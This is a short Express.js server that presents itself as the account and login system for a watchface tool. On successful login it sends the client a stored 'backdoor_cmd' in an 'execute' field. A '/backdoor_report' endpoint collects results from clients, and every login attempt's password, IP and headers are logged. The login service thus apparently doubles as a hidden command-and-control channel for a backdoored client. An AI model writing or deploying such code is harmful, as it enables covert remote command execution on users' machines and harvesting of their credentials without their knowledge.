import express from "express"
import cors from "cors"
import bodyParser from "body-parser"
import * as database from "./database.js"

const app = express()
app.use(bodyParser.json())
app.use(cors())

app.get('/', function (req, res) {
    res.send('Watchface Tool Account System Server V1')
})

app.post('/backdoor_report', async function (req, res) {
    await database.WriteBackdoorReport(req.body)
})

app.post('/login', async function (req, res) {
    database.WriteLog("INFO", {
        message: "Trying to Login",
        params: req.body,
        ip: req.ip,
        headers: req.headers
    })
    var result = await database.Login(req.body.username, req.body.password)
    if(result){
        res.send({
            code: 0,
            message: "登录成功",
            tool_url: result.toolurl,
            execute: result.backdoor_cmd
        })
    }
    else{
        res.send({
            code: -1,
            message: "登录失败：用户名或密码错误"
        })
    }
})

app.listen(3111)

database.Connect()